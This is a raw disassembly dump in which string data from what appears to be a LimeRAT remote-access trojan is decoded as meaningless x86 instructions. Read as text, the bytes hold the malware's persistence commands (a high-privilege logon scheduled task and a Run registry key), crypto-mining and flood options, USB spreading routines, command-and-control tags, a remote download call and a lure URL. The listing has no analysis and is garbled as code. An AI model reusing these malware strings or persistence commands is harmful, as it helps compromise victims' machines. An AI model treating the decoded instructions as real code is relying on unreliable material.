  408031:	00 33                	add    %dh,(%ebx)
  408033:	00 32                	add    %dh,(%edx)
  408035:	00 5f 00             	add    %bl,0x0(%edi)
  408038:	50                   	push   %eax
  408039:	00 72 00             	add    %dh,0x0(%edx)
  40803c:	6f                   	outsl  %ds:(%esi),(%dx)
  40803d:	00 63 00             	add    %ah,0x0(%ebx)
  408040:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408044:	73 00                	jae    0x408046
  408046:	20 00                	and    %al,(%eax)
  408048:	77 00                	ja     0x40804a
  40804a:	68 00 65 00 72       	push   $0x72006500
  40804f:	00 65 00             	add    %ah,0x0(%ebp)
  408052:	20 00                	and    %al,(%eax)
  408054:	4e                   	dec    %esi
  408055:	00 61 00             	add    %ah,0x0(%ecx)
  408058:	6d                   	insl   (%dx),%es:(%edi)
  408059:	00 65 00             	add    %ah,0x0(%ebp)
  40805c:	3d 00 27 00 7b       	cmp    $0x7b002700,%eax
  408061:	00 30                	add    %dh,(%eax)
  408063:	00 7d 00             	add    %bh,0x0(%ebp)
  408066:	27                   	daa
  408067:	00 00                	add    %al,(%eax)
  408069:	15 52 00 65 00       	adc    $0x650052,%eax
  40806e:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  408072:	73 00                	jae    0x408074
  408074:	6d                   	insl   (%dx),%es:(%edi)
  408075:	00 2e                	add    %ch,(%esi)
  408077:	00 65 00             	add    %ah,0x0(%ebp)
  40807a:	78 00                	js     0x40807c
  40807c:	65 00 00             	add    %al,%gs:(%eax)
  40807f:	17                   	pop    %ss
  408080:	43                   	inc    %ebx
  408081:	00 6f 00             	add    %ch,0x0(%edi)
  408084:	6d                   	insl   (%dx),%es:(%edi)
  408085:	00 6d 00             	add    %ch,0x0(%ebp)
  408088:	61                   	popa
  408089:	00 6e 00             	add    %ch,0x0(%esi)
  40808c:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  408091:	00 6e 00             	add    %ch,0x0(%esi)
  408094:	65 00 00             	add    %al,%gs:(%eax)
  408097:	1f                   	pop    %ds
  408098:	2d 00 2d 00 64       	sub    $0x64002d00,%eax
  40809d:	00 6f 00             	add    %ch,0x0(%edi)
  4080a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a1:	00 61 00             	add    %ah,0x0(%ecx)
  4080a4:	74 00                	je     0x4080a6
  4080a6:	65 00 2d 00 6c 00 65 	add    %ch,%gs:0x65006c00
  4080ad:	00 76 00             	add    %dh,0x0(%esi)
  4080b0:	65 00 6c 00 3d       	add    %ch,%gs:0x3d(%eax,%eax,1)
  4080b5:	00 00                	add    %al,(%eax)
  4080b7:	15 4d 00 69 00       	adc    $0x69004d,%eax
  4080bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4080bd:	00 6e 00             	add    %ch,0x0(%esi)
  4080c0:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4080c6:	2e 00 2e             	add    %ch,%cs:(%esi)
  4080c9:	00 2e                	add    %ch,(%esi)
  4080cb:	00 00                	add    %al,(%eax)
  4080cd:	0b 46 00             	or     0x0(%esi),%eax
  4080d0:	6c                   	insb   (%dx),%es:(%edi)
  4080d1:	00 6f 00             	add    %ch,0x0(%edi)
  4080d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4080d5:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  4080d9:	3f                   	aas
  4080da:	57                   	push   %edi
  4080db:	00 69 00             	add    %ch,0x0(%ecx)
  4080de:	6e                   	outsb  %ds:(%esi),(%dx)
  4080df:	00 33                	add    %dh,(%ebx)
  4080e1:	00 32                	add    %dh,(%edx)
  4080e3:	00 5f 00             	add    %bl,0x0(%edi)
  4080e6:	50                   	push   %eax
  4080e7:	00 72 00             	add    %dh,0x0(%edx)
  4080ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4080eb:	00 63 00             	add    %ah,0x0(%ebx)
  4080ee:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4080f2:	73 00                	jae    0x4080f4
  4080f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4080f5:	00 72 00             	add    %dh,0x0(%edx)
  4080f8:	2e 00 64 00 65       	add    %ah,%cs:0x65(%eax,%eax,1)
  4080fd:	00 76 00             	add    %dh,0x0(%esi)
  408100:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  408106:	69 00 64 00 3d 00    	imul   $0x3d0064,(%eax),%eax
  40810c:	22 00                	and    (%eax),%al
  40810e:	43                   	inc    %ebx
  40810f:	00 50 00             	add    %dl,0x0(%eax)
  408112:	55                   	push   %ebp
  408113:	00 30                	add    %dh,(%eax)
  408115:	00 22                	add    %ah,(%edx)
  408117:	00 00                	add    %al,(%eax)
  408119:	0b 49 00             	or     0x0(%ecx),%ecx
  40811c:	6e                   	outsb  %ds:(%esi),(%dx)
  40811d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408121:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  408125:	07                   	pop    %es
  408126:	28 00                	sub    %al,(%eax)
  408128:	52                   	push   %edx
  408129:	00 29                	add    %ch,(%ecx)
  40812b:	00 00                	add    %al,(%eax)
  40812d:	11 43 00             	adc    %eax,0x0(%ebx)
  408130:	6f                   	outsl  %ds:(%esi),(%dx)
  408131:	00 72 00             	add    %dh,0x0(%edx)
  408134:	65 00 28             	add    %ch,%gs:(%eax)
  408137:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40813b:	00 29                	add    %ch,(%ecx)
  40813d:	00 00                	add    %al,(%eax)
  40813f:	07                   	pop    %es
  408140:	43                   	inc    %ebx
  408141:	00 50 00             	add    %dl,0x0(%eax)
  408144:	55                   	push   %ebp
  408145:	00 00                	add    %al,(%eax)
  408147:	0d 55 00 6e 00       	or     $0x6e0055,%eax
  40814c:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40814f:	00 6f 00             	add    %ch,0x0(%edi)
  408152:	77 00                	ja     0x408154
  408154:	00 09                	add    %cl,(%ecx)
  408156:	76 00                	jbe    0x408158
  408158:	34 00                	xor    $0x0,%al
  40815a:	2e 00 30             	add    %dh,%cs:(%eax)
  40815d:	00 00                	add    %al,(%eax)
  40815f:	09 76 00             	or     %esi,0x0(%esi)
  408162:	32 00                	xor    (%eax),%al
  408164:	2e 00 30             	add    %dh,%cs:(%eax)
  408167:	00 00                	add    %al,(%eax)
  408169:	0b 76 00             	or     0x0(%esi),%esi
  40816c:	32 00                	xor    (%eax),%al
  40816e:	2e 00 30             	add    %dh,%cs:(%eax)
  408171:	00 20                	add    %ah,(%eax)
  408173:	00 00                	add    %al,(%eax)
  408175:	03 31                	add    (%ecx),%esi
  408177:	00 00                	add    %al,(%eax)
  408179:	03 33                	add    (%ebx),%esi
  40817b:	00 00                	add    %al,(%eax)
  40817d:	07                   	pop    %es
  40817e:	62 00                	bound  %eax,(%eax)
  408180:	63 00                	arpl   %eax,(%eax)
  408182:	31 00                	xor    %eax,(%eax)
  408184:	00 80 81 31 00 6e    	add    %al,0x6e003181(%eax)
  40818a:	00 77 00             	add    %dh,0x0(%edi)
  40818d:	5a                   	pop    %edx
  40818e:	00 6b 00             	add    %ch,0x0(%ebx)
  408191:	41                   	inc    %ecx
  408192:	00 71 00             	add    %dh,0x0(%ecx)
  408195:	75 00                	jne    0x408197
  408197:	30 00                	xor    %al,(%eax)
  408199:	37                   	aaa
  40819a:	00 69 00             	add    %ch,0x0(%ecx)
  40819d:	4a                   	dec    %edx
  40819e:	00 6c 00 54          	add    %ch,0x54(%eax,%eax,1)
  4081a2:	00 72 00             	add    %dh,0x0(%edx)
  4081a5:	33 00                	xor    (%eax),%eax
  4081a7:	50                   	push   %eax
  4081a8:	00 32                	add    %dh,(%edx)
  4081aa:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  4081ae:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  4081b2:	00 78 00             	add    %bh,0x0(%eax)
  4081b5:	44                   	inc    %esp
  4081b6:	00 42 00             	add    %al,0x0(%edx)
  4081b9:	68 00 58 00 4f       	push   $0x4f005800
  4081be:	00 66 00             	add    %ah,0x0(%esi)
  4081c1:	73 00                	jae    0x4081c3
  4081c3:	56                   	push   %esi
  4081c4:	00 4b 00             	add    %cl,0x0(%ebx)
  4081c7:	49                   	dec    %ecx
  4081c8:	00 50 00             	add    %dl,0x0(%eax)
  4081cb:	79 00                	jns    0x4081cd
  4081cd:	50                   	push   %eax
  4081ce:	00 6f 00             	add    %ch,0x0(%edi)
  4081d1:	76 00                	jbe    0x4081d3
  4081d3:	39 00                	cmp    %eax,(%eax)
  4081d5:	56                   	push   %esi
  4081d6:	00 45 00             	add    %al,0x0(%ebp)
  4081d9:	68 00 31 00 6a       	push   $0x6a003100
  4081de:	00 46 00             	add    %al,0x0(%esi)
  4081e1:	2f                   	das
  4081e2:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4081e6:	00 77 00             	add    %dh,0x0(%edi)
  4081e9:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  4081ed:	63 00                	arpl   %eax,(%eax)
  4081ef:	35 00 71 00 4d       	xor    $0x4d007100,%eax
  4081f4:	00 30                	add    %dh,(%eax)
  4081f6:	00 63 00             	add    %ah,0x0(%ebx)
  4081f9:	71 00                	jno    0x4081fb
  4081fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fc:	00 31                	add    %dh,(%ecx)
  4081fe:	00 70 00             	add    %dh,0x0(%eax)
  408201:	35 00 48 00 77       	xor    $0x77004800,%eax
  408206:	00 00                	add    %al,(%eax)
  408208:	59                   	pop    %ecx
  408209:	6f                   	outsl  %ds:(%esi),(%dx)
  40820a:	00 62 00             	add    %ah,0x0(%edx)
  40820d:	4c                   	dec    %esp
  40820e:	00 44 00 31          	add    %al,0x31(%eax,%eax,1)
  408212:	00 4f 00             	add    %cl,0x0(%edi)
  408215:	58                   	pop    %eax
  408216:	00 32                	add    %dh,(%edx)
  408218:	00 42 00             	add    %al,0x0(%edx)
  40821b:	78 00                	js     0x40821d
  40821d:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  408221:	4d                   	dec    %ebp
  408222:	00 45 00             	add    %al,0x0(%ebp)
  408225:	70 00                	jo     0x408227
  408227:	62 00                	bound  %eax,(%eax)
  408229:	62 00                	bound  %eax,(%eax)
  40822b:	48                   	dec    %eax
  40822c:	00 32                	add    %dh,(%edx)
  40822e:	00 4f 00             	add    %cl,0x0(%edi)
  408231:	6e                   	outsb  %ds:(%esi),(%dx)
  408232:	00 36                	add    %dh,(%esi)
  408234:	00 47 00             	add    %al,0x0(%edi)
  408237:	79 00                	jns    0x408239
  408239:	77 00                	ja     0x40823b
  40823b:	39 00                	cmp    %eax,(%eax)
  40823d:	54                   	push   %esp
  40823e:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  408242:	00 67 00             	add    %ah,0x0(%edi)
  408245:	63 00                	arpl   %eax,(%eax)
  408247:	59                   	pop    %ecx
  408248:	00 4b 00             	add    %cl,0x0(%ebx)
  40824b:	54                   	push   %esp
  40824c:	00 42 00             	add    %al,0x0(%edx)
  40824f:	4b                   	dec    %ebx
  408250:	00 57 00             	add    %dl,0x0(%edi)
  408253:	32 00                	xor    (%eax),%al
  408255:	78 00                	js     0x408257
  408257:	39 00                	cmp    %eax,(%eax)
  408259:	6a 00                	push   $0x0
  40825b:	70 00                	jo     0x40825d
  40825d:	38 00                	cmp    %al,(%eax)
  40825f:	3d 00 00 0b 7c       	cmp    $0x7c0b0000,%eax
  408264:	00 27                	add    %ah,(%edi)
  408266:	00 4e 00             	add    %cl,0x0(%esi)
  408269:	27                   	daa
  40826a:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  40826e:	0b 7c 00 27          	or     0x27(%eax,%eax,1),%edi
  408272:	00 4c 00 27          	add    %cl,0x27(%eax,%eax,1)
  408276:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  40827a:	31 6b 00             	xor    %ebp,0x0(%ebx)
  40827d:	61                   	popa
  40827e:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  408282:	00 61 00             	add    %ah,0x0(%ecx)
  408285:	6e                   	outsb  %ds:(%esi),(%dx)
  408286:	00 6f 00             	add    %ch,0x0(%edi)
  408289:	6e                   	outsb  %ds:(%esi),(%dx)
  40828a:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40828e:	00 6e 00             	add    %ch,0x0(%esi)
  408291:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  408295:	61                   	popa
  408296:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40829a:	00 61 00             	add    %ah,0x0(%ecx)
  40829d:	61                   	popa
  40829e:	00 70 00             	add    %dh,0x0(%eax)
  4082a1:	70 00                	jo     0x4082a3
  4082a3:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4082a7:	78 00                	js     0x4082a9
  4082a9:	65 00 00             	add    %al,%gs:(%eax)
  4082ac:	09 54 00 72          	or     %edx,0x72(%eax,%eax,1)
  4082b0:	00 75 00             	add    %dh,0x0(%ebp)
  4082b3:	65 00 00             	add    %al,%gs:(%eax)
  4082b6:	0f 41 00             	cmovno (%eax),%eax
  4082b9:	70 00                	jo     0x4082bb
  4082bb:	70 00                	jo     0x4082bd
  4082bd:	44                   	inc    %esp
  4082be:	00 61 00             	add    %ah,0x0(%ecx)
  4082c1:	74 00                	je     0x4082c3
  4082c3:	61                   	popa
  4082c4:	00 00                	add    %al,(%eax)
  4082c6:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  4082ca:	65 68 00 74 00 74    	gs push $0x74007400
  4082d0:	00 70 00             	add    %dh,0x0(%eax)
  4082d3:	73 00                	jae    0x4082d5
  4082d5:	3a 00                	cmp    (%eax),%al
  4082d7:	2f                   	das
  4082d8:	00 2f                	add    %ch,(%edi)
  4082da:	00 6b 00             	add    %ch,0x0(%ebx)
  4082dd:	61                   	popa
  4082de:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  4082e2:	00 61 00             	add    %ah,0x0(%ecx)
  4082e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4082e6:	00 6f 00             	add    %ch,0x0(%edi)
  4082e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4082ea:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4082ee:	00 6e 00             	add    %ch,0x0(%esi)
  4082f1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4082f5:	61                   	popa
  4082f6:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  4082fa:	00 61 00             	add    %ah,0x0(%ecx)
  4082fd:	61                   	popa
  4082fe:	00 70 00             	add    %dh,0x0(%eax)
  408301:	70 00                	jo     0x408303
  408303:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  408307:	6e                   	outsb  %ds:(%esi),(%dx)
  408308:	00 2e                	add    %ch,(%esi)
  40830a:	00 6e 00             	add    %ch,0x0(%esi)
  40830d:	65 00 74 00 2f       	add    %dh,%gs:0x2f(%eax,%eax,1)
  408312:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408316:	00 69 00             	add    %ch,0x0(%ecx)
  408319:	2d 00 61 00 70       	sub    $0x70006100,%eax
  40831e:	00 70 00             	add    %dh,0x0(%eax)
  408321:	2d 00 6b 00 75       	sub    $0x75006b00,%eax
  408326:	00 62 00             	add    %ah,0x0(%edx)
  408329:	65 00 74 00 2f       	add    %dh,%gs:0x2f(%eax,%eax,1)
  40832e:	00 00                	add    %al,(%eax)
  408330:	05 4f 00 4b 00       	add    $0x4b004f,%eax
  408335:	00 0d 21 00 50 00    	add    %cl,0x500021
  40833b:	53                   	push   %ebx
  40833c:	00 65 00             	add    %ah,0x0(%ebp)
  40833f:	6e                   	outsb  %ds:(%esi),(%dx)
  408340:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  408344:	05 21 00 50 00       	add    $0x500021,%eax
  408349:	00 09                	add    %cl,(%ecx)
  40834b:	21 00                	and    %eax,(%eax)
  40834d:	43                   	inc    %ebx
  40834e:	00 41 00             	add    %al,0x0(%ecx)
  408351:	50                   	push   %eax
  408352:	00 00                	add    %al,(%eax)
  408354:	07                   	pop    %es
  408355:	43                   	inc    %ebx
  408356:	00 50 00             	add    %dl,0x0(%eax)
  408359:	4c                   	dec    %esp
  40835a:	00 00                	add    %al,(%eax)
  40835c:	07                   	pop    %es
  40835d:	49                   	dec    %ecx
  40835e:	00 50 00             	add    %dl,0x0(%eax)
  408361:	4c                   	dec    %esp
  408362:	00 00                	add    %al,(%eax)
  408364:	09 49 00             	or     %ecx,0x0(%ecx)
  408367:	50                   	push   %eax
  408368:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40836c:	00 00                	add    %al,(%eax)
  40836e:	0f 21 00             	mov    %db0,%eax
  408371:	50                   	push   %eax
  408372:	00 53 00             	add    %dl,0x0(%ebx)
  408375:	74 00                	je     0x408377
  408377:	61                   	popa
  408378:	00 72 00             	add    %dh,0x0(%edx)
  40837b:	74 00                	je     0x40837d
  40837d:	00 09                	add    %cl,(%ecx)
  40837f:	23 00                	and    (%eax),%eax
  408381:	43                   	inc    %ebx
  408382:	00 41 00             	add    %al,0x0(%ecx)
  408385:	50                   	push   %eax
  408386:	00 00                	add    %al,(%eax)
  408388:	07                   	pop    %es
  408389:	47                   	inc    %edi
  40838a:	00 50 00             	add    %dl,0x0(%eax)
  40838d:	4c                   	dec    %esp
  40838e:	00 00                	add    %al,(%eax)
  408390:	07                   	pop    %es
  408391:	4d                   	dec    %ebp
  408392:	00 53 00             	add    %dl,0x0(%ebx)
  408395:	47                   	inc    %edi
  408396:	00 00                	add    %al,(%eax)
  408398:	0f 45 00             	cmovne (%eax),%eax
  40839b:	72 00                	jb     0x40839d
  40839d:	72 00                	jb     0x40839f
  40839f:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a0:	00 72 00             	add    %dh,0x0(%edx)
  4083a3:	21 00                	and    %eax,(%eax)
  4083a5:	20 00                	and    %al,(%eax)
  4083a7:	00 05 43 00 4e 00    	add    %al,0x4e0043
  4083ad:	00 09                	add    %cl,(%ecx)
  4083af:	4d                   	dec    %ebp
  4083b0:	00 49 00             	add    %cl,0x0(%ecx)
  4083b3:	53                   	push   %ebx
  4083b4:	00 43 00             	add    %al,0x0(%ebx)
  4083b7:	00 05 43 00 4c 00    	add    %al,0x4c0043
  4083bd:	00 1d 50 00 6c 00    	add    %bl,0x6c0050
  4083c3:	75 00                	jne    0x4083c5
  4083c5:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4083c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ca:	00 20                	add    %ah,(%eax)
  4083cc:	00 45 00             	add    %al,0x0(%ebp)
  4083cf:	72 00                	jb     0x4083d1
  4083d1:	72 00                	jb     0x4083d3
  4083d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d4:	00 72 00             	add    %dh,0x0(%edx)
  4083d7:	21 00                	and    %eax,(%eax)
  4083d9:	20 00                	and    %al,(%eax)
  4083db:	00 0d 6c 00 65 00    	add    %cl,0x65006c
  4083e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e2:	00 67 00             	add    %ah,0x0(%edi)
  4083e5:	74 00                	je     0x4083e7
  4083e7:	68 00 00 1d 44       	push   $0x441d0000
  4083ec:	00 6f 00             	add    %ch,0x0(%edi)
  4083ef:	77 00                	ja     0x4083f1
  4083f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f2:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4083f6:	00 61 00             	add    %ah,0x0(%ecx)
  4083f9:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  4083fd:	74 00                	je     0x4083ff
  4083ff:	72 00                	jb     0x408401
  408401:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  408407:	00 03                	add    %al,(%ebx)
  408409:	3a 00                	cmp    (%eax),%al
  40840b:	00 09                	add    %cl,(%ecx)
  40840d:	69 00 6e 00 66 00    	imul   $0x66006e,(%eax),%eax
  408413:	6f                   	outsl  %ds:(%esi),(%dx)
  408414:	00 00                	add    %al,(%eax)
  408416:	11 76 00             	adc    %esi,0x0(%esi)
  408419:	30 00                	xor    %al,(%eax)
  40841b:	2e 00 31             	add    %dh,%cs:(%ecx)
  40841e:	00 2e                	add    %ch,(%esi)
  408420:	00 39                	add    %bh,(%ecx)
  408422:	00 2e                	add    %ch,(%esi)
  408424:	00 31                	add    %dh,(%ecx)
  408426:	00 00                	add    %al,(%eax)
  408428:	07                   	pop    %es
  408429:	2e 00 2e             	add    %ch,%cs:(%esi)
  40842c:	00 2e                	add    %ch,(%esi)
  40842e:	00 00                	add    %al,(%eax)
  408430:	05 4b 00 41 00       	add    $0x41004b,%eax
  408435:	00 07                	add    %al,(%edi)
  408437:	44                   	inc    %esp
  408438:	00 57 00             	add    %dl,0x0(%edi)
  40843b:	4e                   	dec    %esi
  40843c:	00 00                	add    %al,(%eax)
  40843e:	0b 53 00             	or     0x0(%ebx),%edx
  408441:	74 00                	je     0x408443
  408443:	61                   	popa
  408444:	00 72 00             	add    %dh,0x0(%edx)
  408447:	74 00                	je     0x408449
  408449:	00 80 89 73 00 63    	add    %al,0x63007389(%eax)
  40844f:	00 68 00             	add    %ch,0x0(%eax)
  408452:	74 00                	je     0x408454
  408454:	61                   	popa
  408455:	00 73 00             	add    %dh,0x0(%ebx)
  408458:	6b 00 73             	imul   $0x73,(%eax),%eax
  40845b:	00 20                	add    %ah,(%eax)
  40845d:	00 2f                	add    %ch,(%edi)
  40845f:	00 63 00             	add    %ah,0x0(%ebx)
  408462:	72 00                	jb     0x408464
  408464:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  408468:	74 00                	je     0x40846a
  40846a:	65 00 20             	add    %ah,%gs:(%eax)
  40846d:	00 2f                	add    %ch,(%edi)
  40846f:	00 66 00             	add    %ah,0x0(%esi)
  408472:	20 00                	and    %al,(%eax)
  408474:	2f                   	das
  408475:	00 73 00             	add    %dh,0x0(%ebx)
  408478:	63 00                	arpl   %eax,(%eax)
  40847a:	20 00                	and    %al,(%eax)
  40847c:	4f                   	dec    %edi
  40847d:	00 4e 00             	add    %cl,0x0(%esi)
  408480:	4c                   	dec    %esp
  408481:	00 4f 00             	add    %cl,0x0(%edi)
  408484:	47                   	inc    %edi
  408485:	00 4f 00             	add    %cl,0x0(%edi)
  408488:	4e                   	dec    %esi
  408489:	00 20                	add    %ah,(%eax)
  40848b:	00 2f                	add    %ch,(%edi)
  40848d:	00 52 00             	add    %dl,0x0(%edx)
  408490:	4c                   	dec    %esp
  408491:	00 20                	add    %ah,(%eax)
  408493:	00 48 00             	add    %cl,0x0(%eax)
  408496:	49                   	dec    %ecx
  408497:	00 47 00             	add    %al,0x0(%edi)
  40849a:	48                   	dec    %eax
  40849b:	00 45 00             	add    %al,0x0(%ebp)
  40849e:	53                   	push   %ebx
  40849f:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  4084a3:	00 2f                	add    %ch,(%edi)
  4084a5:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  4084a9:	00 20                	add    %ah,(%eax)
  4084ab:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  4084af:	00 6d 00             	add    %ch,0x0(%ebp)
  4084b2:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  4084b6:	41                   	inc    %ecx
  4084b7:	00 54 00 2d          	add    %dl,0x2d(%eax,%eax,1)
  4084bb:	00 41 00             	add    %al,0x0(%ecx)
  4084be:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  4084c2:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4084c8:	2f                   	das
  4084c9:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4084cd:	00 20                	add    %ah,(%eax)
  4084cf:	00 22                	add    %ah,(%edx)
  4084d1:	00 27                	add    %ah,(%edi)
  4084d3:	00 00                	add    %al,(%eax)
  4084d5:	05 27 00 22 00       	add    $0x220027,%eax
  4084da:	00 5d 53             	add    %bl,0x53(%ebp)
  4084dd:	00 6f 00             	add    %ch,0x0(%edi)
  4084e0:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4084e5:	00 61 00             	add    %ah,0x0(%ecx)
  4084e8:	72 00                	jb     0x4084ea
  4084ea:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4084ef:	00 69 00             	add    %ch,0x0(%ecx)
  4084f2:	63 00                	arpl   %eax,(%eax)
  4084f4:	72 00                	jb     0x4084f6
  4084f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f7:	00 73 00             	add    %dh,0x0(%ebx)
  4084fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4084fb:	00 66 00             	add    %ah,0x0(%esi)
  4084fe:	74 00                	je     0x408500
  408500:	5c                   	pop    %esp
  408501:	00 57 00             	add    %dl,0x0(%edi)
  408504:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40850a:	6f                   	outsl  %ds:(%esi),(%dx)
  40850b:	00 77 00             	add    %dh,0x0(%edi)
  40850e:	73 00                	jae    0x408510
  408510:	5c                   	pop    %esp
  408511:	00 43 00             	add    %al,0x0(%ebx)
  408514:	75 00                	jne    0x408516
  408516:	72 00                	jb     0x408518
  408518:	72 00                	jb     0x40851a
  40851a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40851e:	74 00                	je     0x408520
  408520:	56                   	push   %esi
  408521:	00 65 00             	add    %ah,0x0(%ebp)
  408524:	72 00                	jb     0x408526
  408526:	73 00                	jae    0x408528
  408528:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40852e:	5c                   	pop    %esp
  40852f:	00 52 00             	add    %dl,0x0(%edx)
  408532:	75 00                	jne    0x408534
  408534:	6e                   	outsb  %ds:(%esi),(%dx)
  408535:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  408539:	05 21 00 52 00       	add    $0x520021,%eax
  40853e:	00 07                	add    %al,(%edi)
  408540:	21 00                	and    %eax,(%eax)
  408542:	53                   	push   %ebx
  408543:	00 50 00             	add    %dl,0x0(%eax)
  408546:	00 05 21 00 58 00    	add    %al,0x580021
  40854c:	00 0f                	add    %cl,(%edi)
  40854e:	46                   	inc    %esi
  40854f:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  408553:	00 6f 00             	add    %ch,0x0(%edi)
  408556:	64 00 21             	add    %ah,%fs:(%ecx)
  408559:	00 20                	add    %ah,(%eax)
  40855b:	00 00                	add    %al,(%eax)
  40855d:	09 5f 00             	or     %ebx,0x0(%edi)
  408560:	55                   	push   %ebp
  408561:	00 53 00             	add    %dl,0x0(%ebx)
  408564:	42                   	inc    %edx
  408565:	00 00                	add    %al,(%eax)
  408567:	0b 50 00             	or     0x0(%eax),%edx
  40856a:	4c                   	dec    %esp
  40856b:	00 55 00             	add    %dl,0x0(%ebp)
  40856e:	53                   	push   %ebx
  40856f:	00 42 00             	add    %al,0x0(%edx)
  408572:	00 19                	add    %bl,(%ecx)
  408574:	5f                   	pop    %edi
  408575:	00 55 00             	add    %dl,0x0(%ebp)
  408578:	53                   	push   %ebx
  408579:	00 42 00             	add    %al,0x0(%edx)
  40857c:	20 00                	and    %al,(%eax)
  40857e:	45                   	inc    %ebp
  40857f:	00 72 00             	add    %dh,0x0(%edx)
  408582:	72 00                	jb     0x408584
  408584:	6f                   	outsl  %ds:(%esi),(%dx)
  408585:	00 72 00             	add    %dh,0x0(%edx)
  408588:	21 00                	and    %eax,(%eax)
  40858a:	20 00                	and    %al,(%eax)
  40858c:	00 09                	add    %cl,(%ecx)
  40858e:	5f                   	pop    %edi
  40858f:	00 50 00             	add    %dl,0x0(%eax)
  408592:	49                   	dec    %ecx
  408593:	00 4e 00             	add    %cl,0x0(%esi)
  408596:	00 0b                	add    %cl,(%ebx)
  408598:	50                   	push   %eax
  408599:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40859d:	00 49 00             	add    %cl,0x0(%ecx)
  4085a0:	4e                   	dec    %esi
  4085a1:	00 00                	add    %al,(%eax)
  4085a3:	19 5f 00             	sbb    %ebx,0x0(%edi)
  4085a6:	50                   	push   %eax
  4085a7:	00 49 00             	add    %cl,0x0(%ecx)
  4085aa:	4e                   	dec    %esi
  4085ab:	00 20                	add    %ah,(%eax)
  4085ad:	00 45 00             	add    %al,0x0(%ebp)
  4085b0:	72 00                	jb     0x4085b2
  4085b2:	72 00                	jb     0x4085b4
  4085b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b5:	00 72 00             	add    %dh,0x0(%edx)
  4085b8:	21 00                	and    %eax,(%eax)
  4085ba:	20 00                	and    %al,(%eax)
  4085bc:	00 00                	add    %al,(%eax)
  4085be:	00 00                	add    %al,(%eax)
  4085c0:	a9 ac f8 9f 8f       	test   $0x8f9ff8ac,%eax
  4085c5:	fa                   	cli
  4085c6:	10 4e 91             	adc    %cl,-0x6f(%esi)
  4085c9:	81 a8 99 e4 94 8f 69 	subl   $0xb7080069,-0x706b1b67(%eax)
  4085d0:	00 08 b7 
  4085d3:	7a 5c                	jp     0x408631
  4085d5:	56                   	push   %esi
  4085d6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4085d9:	89 08                	mov    %ecx,(%eax)
  4085db:	b0 3f                	mov    $0x3f,%al
  4085dd:	5f                   	pop    %edi
  4085de:	7f 11                	jg     0x4085f1
  4085e0:	d5 0a                	aad    $0xa
